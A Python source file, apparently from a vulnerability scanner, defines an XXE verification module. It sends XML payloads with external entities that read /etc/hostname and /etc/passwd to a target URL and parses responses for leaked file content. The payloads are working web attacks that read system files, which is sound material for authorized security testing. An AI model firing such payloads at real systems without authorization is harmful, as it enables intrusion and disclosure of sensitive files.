"""XXE Verification Module.

Tests for XML External Entity (XXE) injection by sending XML payloads
with external entity definitions and checking if the entity is resolved.
"""
import logging
from app.ai_assistant.verification.base_module import BaseVerificationModule

logger = logging.getLogger(__name__)


class XXEModule(BaseVerificationModule):
    """XXE verification module."""

    VULN_TYPE = "XXE"
    KEYWORD = "xxe"

    # Unique marker to detect entity resolution
    MARKER = "xxe_verify_7x9k"

    def generate_payloads(self):
        """Generate XXE test payloads."""
        return [
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "{self.MARKER}">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ]

    def verify(self, param_name, location, method):
        """Run XXE verification."""
        payloads = self.generate_payloads()

        for payload in payloads:
            # XXE needs to be sent as POST with XML content-type
            try:
                import requests
                headers = dict(self.headers)
                headers['Content-Type'] = 'application/xml'

                resp = requests.post(self.url, data=payload, headers=headers, timeout=10, verify=False, allow_redirects=False)
            except Exception:
                # Fallback to GET (some endpoints accept XML in GET params)
                resp = self._send_request(param_name, payload, method)

            if not resp:
                continue

            evidence = self.collect_evidence(resp, payload)
            if evidence:
                confidence = self.calculate_confidence(evidence)

                return self._build_result(
                    status='verified' if confidence >= 0.8 else 'potential',
                    param_name=param_name,
                    location=location,
                    method='POST (XML)',
                    payload=payload[:100] + '...',
                    evidence=evidence,
                    confidence=confidence,
                    technique='XML Entity Resolution Detection',
                    request_sent=f'POST {self.url} (XML body)',
                    response_summary=f"Status: {resp.status_code}, Length: {len(resp.text)}",
                )

        return self._build_result(
            status='not_vulnerable',
            param_name=param_name,
            location=location,
            method=method,
            payload=payloads[0][:80] + '...',
            evidence='No XML entity resolution detected.',
            confidence=0.0,
            technique='XML Entity Resolution Detection',
        )

    def collect_evidence(self, response, payload, baseline_response=None):
        """Check if XXE entity was resolved in the response."""
        resp_text = response.text

        # Check if our marker was resolved (basic entity test)
        if self.MARKER in resp_text:
            return f"XXE confirmed: Custom entity was resolved. Marker '{self.MARKER}' found in response."

        # Check for /etc/hostname content
        if 'file:///etc/hostname' in payload:
            # hostname response is usually a short string
            if len(resp_text.strip()) > 0 and len(resp_text.strip()) < 100:
                if resp_text.strip().replace('\n', '').isalnum() or '-' in resp_text.strip():
                    return f"XXE confirmed: /etc/hostname content returned: '{resp_text.strip()[:50]}'"

        # Check for /etc/passwd content
        if 'file:///etc/passwd' in payload:
            if 'root:x:' in resp_text or 'root:$' in resp_text:
                pos = resp_text.find('root:')
                context = resp_text[pos:pos + 60]
                return f"XXE confirmed: /etc/passwd content returned: {context}"

        return None

    def calculate_confidence(self, evidence):
        """Calculate confidence."""
        if 'marker' in evidence.lower() or 'entity was resolved' in evidence.lower():
            return 1.0
        if 'passwd' in evidence.lower():
            return 1.0
        if 'hostname' in evidence.lower():
            return 0.9
        return 0.3
